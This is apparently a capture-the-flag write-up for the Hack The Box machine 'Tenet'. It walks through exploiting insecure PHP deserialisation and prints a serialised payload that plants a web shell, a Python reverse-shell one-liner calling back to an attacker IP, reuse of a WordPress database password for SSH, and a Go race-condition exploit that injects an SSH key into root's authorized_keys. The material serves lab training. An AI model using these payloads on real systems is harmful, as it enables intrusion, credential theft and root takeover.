@@ -1,0 +1,330 @@
+Tenet
+
+8th June 2021 / Document No D21.100.122
+Prepared By: TRX
+Machine Author(s): egotisticalSW
+Difficulty: Medium
+Classification: Official
+Synopsis
+
+Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with
+a few posts. One of the comments on the blog mentions the presence of a PHP file along with it's backup. It
+is possible after identificaiton of the backup file to review it's source code. The code in PHP file is vulnerable
+to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is
+achieved. While enumerating the system it was found that the Wordpress configuration file can be read and
+thus gaining access to a set of credentials. By using them we can move laterally from user www-data to user
+Neil . Further system enumeration reveals that this user have root permissions to run a bash script
+through sudo . The script is writing SSH public keys to the authorized_keys file of the root user and is
+vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the
+authorized_keys file and use them to login to the system as root .
+
+Skills Required
+
+      Enumeration
+      Good knowledge of PHP
+      Bash scripting knowledge
+
+Skills Learned
+
+      Exploitation of an Insecure Deserialisation
+      Exploitation of a Race Condition in a Bash script
+Enumeration
+
+Nmap
+
+Let's begin by running nmap scan.
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.223 | grep '^[0-9]' | cut -d '/' -f 1 |
+   tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.10.10.223
+
+The scan reveals open ports 22 (SSH) and 80 (Apache).
+
+HTTP
+
+Navigate to port 80 using a browser to check out the website.
+The page returns the default Apache2 page for Ubuntu. We run a GoBuster scan to enumerate hidden files
+and folders.
+
+   gobuster dir -u http://10.10.10.223 -w /usr/share/wordlists/dirb/common.txt
+
+The scan reveals the wordpress directory and upon navigating to it, a seemingly broken WordPress page is
+presented. Upon selecting on any of the links called TENET , the webpage redirects to the hostname
+tenet.htb . Add this to the hosts file to further proceed or enumeration.
+
+   echo "10.10.10.223 tenet.htb" >> /etc/hosts
+By refreshing the page and the following content will now be visible.
+The WordPress page contains three blog posts with the most interesting one refferring to a data migration.
+
+This post contains a comment that references a file called sator.php as well as a backup it that has
+supposedly been removed due to the migration.
+We navigate to http://tenet.htb/sator.php to check the file presence. A Not Found message is being
+returned, however, it is also possible the file to exist outside the virtual host tenet.htb . We can navigate to
+http://10.10.10.223/sator.php and indeed the following output is being shown.
+
+   [+] Grabbing users from text file
+   [] Database updated
+
+A backup of the PHP file was also referenced and the most common backup file extension is .bak . If such a
+file exists it might be able to provide the source code of file sator.php . We navigate to
+http://10.10.10.223/sator.php.bak to download the file and then review it's source code using any text
+viewer like cat .
+
+   <?php
+
+   class DatabaseExport
+   {
+
+      public $user_file = 'users.txt';
+      public $data = '';
+
+      public function update_db()
+      {
+
+          echo '[+] Grabbing users from text file <br>';
+          $this-> data = 'Success';
+      }
+
+      public function __destruct()
+      {
+
+          file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
+          echo '[] Database updated <br>';
+      // echo 'Gotta get this working properly...';
+      }
+   }
+   $input = $_GET['arepo'] ?? '';
+   $databaseupdate = unserialize($input);
+
+   $app = new DatabaseExport;
+   $app -> update_db();
+   ?>
+
+The code defines a class called DatabaseExport that makes use of the __destruct() magic function in
+order to create a file called users.txt filled with user defined data.
+
+The data is supposed to be read from the arepo parameter using a GET request and unserialized ,
+however, the data is never passed to the instantiated class, as it is noted that the code does not yet work
+correctly. Finally the update_db() function is called.
+Foothold
+
+Remote Code Execution
+
+It is possible to exploit the above functionality and specifically the unserialize function in order to abuse
+the DatabaseExport class and write a shell into the Web Server folder that could then be used for Remote
+Code Execution. First we need to generate though a serialised payload. Consider the following code.
+
+     <?php
+   class DatabaseExport
+   {
+
+        public $user_file='attack.php';
+        public $data = '<?php system($_GET["cmd"]);?>';
+   }
+   $payload = new DatabaseExport;
+   echo (serialize($payload));
+   ?>
+
+An instance of the DatabaseExport class is created and the data variable is filled with a basic web shell
+that receives input from the cmd parameter and uses the system function to execute commands. This data
+will be written to a file called attack.php . Finally the payload is serialised. We place the code inside a file
+called generate.php and run it as follows.
+
+   php generate.php
+
+The following payload is echoed out.
+
+   O:14:"DatabaseExport":2:{s:9:"user_file";s:10:"attack.php";s:4:"data";s:29:"<?php
+   system($_GET["cmd"]);?>";}
+
+We copy the above payload and paste it into the URL as the value of the arepo parameter.
+
+   http://10.10.10.223/sator.php?arepo=O:14:"DatabaseExport":2:
+   {s:9:"user_file";s:10:"attack.php";s:4:"data";s:29:"<?php system($_GET["cmd"]);?>";}
+
+The following output is received.
+
+   [+] Grabbing users from text file
+   [] Database updated
+   [] Database updated
+
+We notice that the Database updated message is shown twice, which means that the payload was
+successfully executed. We navigate to http://10.10.10.223/attack.php and use the cmd variable to
+execute our command.
+   http://10.10.10.223/attack.php?cmd=id
+The above command returns the ID of the www-data user and thus code execution is achieved.
+
+   uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Reverse Shell
+
+The web shell can now be used to receive a reverse shell on our system.
+   which python3
+   /usr/bin/python3
+
+The above command shows that Python3 is installed on the system and so it can be used to get a reverse
+shell.
+We initiate a Netcat listener to receive the shell on.
+
+   nc -lvp 1234
+Finally we use the following payload in the cmd parameter.
+
+   python3 -c 'import
+   socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.
+   10.14.4",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
+   os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+A reverse shell is successfully received as the www-data user, however, we yet lack the permissions to read
+the user.txt .
+Lateral Movement
+
+From our initial system enumeration we spot the common location that wordpress credentials are stored in
+the related configuration file that is located under /var/www/html/wordpress/ directory.
+
+   cat /var/www/html/wordpress/wp-config.php
+The file contains the following database credentials that are used to connect to MySQL.
+
+   / ** MySQL settings - You can get this info from your web host ** //
+   /** The name of the database for WordPress */
+   define( 'DB_NAME', 'wordpress' );
+   /** MySQL database username */
+   define( 'DB_USER', 'neil' );
+   /** MySQL database password */
+   define( 'DB_PASSWORD', 'Opera2112' );
+   /** MySQL hostname */
+   define( 'DB_HOST', 'localhost' )
+System enumeration revealed us that a user called Neil indeed exists, therefore it is worth checking if this
+password has been re-used also for system login. As the SSH service is running on the system, we can try to
+test to connect to user neil with the above credentials.
+   ssh neil@10.10.10.223
+
+The connection is successful and the user flag can now be read under /home/neil directory.
+Privilege Escalation
+
+Enumeration of the neil privileges reveals that he is able to execute the shell script
+/usr/local/bin/enableSSH.sh , as root.
+
+   sudo -l
+
+The script it's readable and contains the following code.
+
+   #!/bin/bash
+   checkAdded() {
+
+      sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
+      if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
+
+          /bin/echo "Successfully added $sshName to authorized_keys file!"
+      else
+
+          /bin/echo "Error in adding $sshName to authorized_keys file!"
+      fi
+   }
+   checkFile() {
+      if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
+
+          /bin/echo "Error in creating key file!"
+          if [[ -f $1 ]]; then /bin/rm $1; fi
+          exit 1
+      fi
+   }
+   addKey() {
+      tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+      (umask 110; touch $tmpName)
+      /bin/echo $key >>$tmpName
+      checkFile $tmpName
+      /bin/cat $tmpName >>/root/.ssh/authorized_keys
+      /bin/rm $tmpName
+   }
+
+   key="ssh-rsa
+   AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGv
+   SruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP
+   656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N
+   31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kpl
+   Ln2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
+   addKey
+   checkAdded
+
+The script can be run to add a hardcoded public RSA key to the root user's authorized_keys file.
+Specifically there are three functions in the script, addKey , checkFile and checkAdded .
+
+The first function uses the mktemp command in order to generate a temporary file name in /tmp where
+the RSA key will be stored. It is worth noting that the -u option is unsafe according to the man page of
+mktemp and is only used to print a file name without actually creating the file. The file is then created using
+touch and a umask of 110 is used, which means the file is writeable by everyone on the system. The
+checkFile function is then called and the contents of the RSA key are placed in the newly created file.
+
+The checkFile function checks the SSH name that was added in the authorized_keys file to make sure it
+is root@ubuntu and prints the corresponding message.
+
+Finally, checkAdded reads the authorized_keys file to confirm the successful addition of keys .
+
+This script is vulnerable to a Race Condition due to the mistakes noted and specifically the wrong usage of
+mktemp , the misuse of the umask , the usage of the double >> in the echo command, which appends to the
+file instead of overwriting and finally the temporary file is created in a public directory and can be edited by
+any user.
+
+For the exploitation to work we generate new SSH keys locally.
+
+   ssh-keygen -f /root/id_rsa -N ""
+
+Next we copy the contents of id_rsa.pub and replace the existing key in the following code.
+
+   package main
+   import (
+
+      "fmt"
+      "path/filepath"
+      "io/ioutil"
+   )
+   func main() {
+      contents := []byte("ssh-rsa
+   AAAAB3NzaC1yc2EAAAADAQABAAABgQD0e/9r40oZpqy2YdTFkTnZ5AGrjF9Sid4UKEITtihNvt66Or0bMYDpzAF
+   GLcuus9bqvxnyHZ5wjIXLAgixfJaNx0pSb5ssug5vPJen1tri8CDXrXGGsvyhOEIP82en8XsPXqiZ9SWEtMSSQf
+   CWcjH66GyeM+Uuqmvk6HuukTu3ZjfyP/Lspkid4NnDfDG0HwlmXj1sVG1iIh08kNU0r+xfyA2Ebgk2K2/zJvohR
+   gEKObMSr6jq2lK2Xso1iEOVd3KIcDHE5UkH2V1Jlqw4mIQhqN4fOKljhWzDCEWRQEb2hlRiMPiyFSkN8tK+Jyot
+   y7CFEdG6vTsu/hxdWESL+L80USxTwyG7BKmn5LyXYS0i+bWoGvgg9mkJZ2Wzv3g+ueycVUEGu7jwJn8Y30fFmZC
+   Vqu0vnaUoRDjGslWpsm5fKVdi9SsJvO2AjRhK1ghqHRCXeleN9rpCMnd6jzmVMsHtlghoKJgEBSvA+kfwx9dHZt
+   7cyix43mzA/FjgUFH7Zak= trx@parrot\n root@ubuntu");
+
+      for {
+          matches, _ := filepath.Glob("/tmp/ssh-*")
+          for _, file := range matches {
+              fmt.Println(file);
+              ioutil.WriteFile(file, contents, 0666);
+              fmt.Println("File written successfully");
+
+   }}
+   }
+
+The above code, written in Go programming language, searches the /tmp folder for files with the starting
+pattern of ssh-* and replaces the contents with the previously created public SSH key. We first need to
+build it.
+
+   go build exploit.go
+
+We can use the scp to copy the compiled file to the target system.
+
+   scp exploit neil@tenet.htb:/tmp
+
+Then we can open a second SSH session to the system.
+
+   ssh neil@tenet.htb
+
+The first SSH connection will be used to run the exploit and the second will be used to run the
+enableSSH.sh script. Navigate to /tmp and execute the exploit.
+
+   cd /tmp
+   chmod +x exploit
+   ./exploit
+On the second terminal run the enableSSH script.
+   sudo /usr/local/bin/enableSSH.sh
+
+The SSH script will need to run a few times before the message Successfully added root@ubuntu to
+authorized_keys file! appears. Once this happens we can now SSH to the root user using the RSA keys
+we generated earlier.
+
+   ssh -i id_rsa root@tenet.htb
+
+This is successful and the root flag can be found in /root .
+
